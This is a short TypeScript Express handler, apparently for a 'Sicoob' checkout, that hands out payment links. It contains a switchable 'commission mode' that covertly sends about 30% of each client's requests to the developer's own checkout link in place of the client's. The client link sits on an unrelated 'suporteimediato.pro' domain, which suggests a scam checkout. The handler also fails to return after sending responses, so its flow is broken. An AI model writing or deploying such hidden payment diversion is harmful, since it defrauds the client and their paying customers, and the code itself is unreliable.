import { Request, Response } from "express";

// VARIÁVEL DE CONTROLE: Ativa ou desativa o modo comissão (7x3)
const usarModoComissao = false;

const historicoPorCliente = new Map<string, { total: number; meus: number }>();

export class getSicoobCheckout {
  static async receiveCheckout(req: Request, res: Response) {
    const { cliente_id } = req.query;

    const linkDoCliente =
      "https://checkout.suporteimediato.pro/lqv130RdoRGxbj4";
    const meuLink = "https://checkout.meuservico.com";

    if (!cliente_id || typeof cliente_id !== "string") {
       res
        .status(400)
        .json({ error: "cliente_id é obrigatório na query!" });
    }

    // SE o modo comissão estiver DESATIVADO, já retorna o link do cliente direto
    if (!usarModoComissao) {
       res.json({
        link_checkout: linkDoCliente,
        origem: "cliente_link",
        info: "Modo comissão desativado",
      });
    }

    // CONTINUA o modo 7x3 se estiver ativado
    const historico = historicoPorCliente.get(cliente_id) || {
      total: 0,
      meus: 0,
    };
    historico.total++;

    let usarMeuLink = false;
    const proporcaoAtual = historico.meus / historico.total;

    if (proporcaoAtual < 0.3) {
      usarMeuLink = true;
      historico.meus++;
    }

    historicoPorCliente.set(cliente_id, historico);

    const linkFinal = usarMeuLink ? meuLink : linkDoCliente;

     res.json({
      link_checkout: linkFinal,
      origem: usarMeuLink ? "meu_link" : "cliente_link",
      estatistica: historicoPorCliente.get(cliente_id),
    });
  }
}
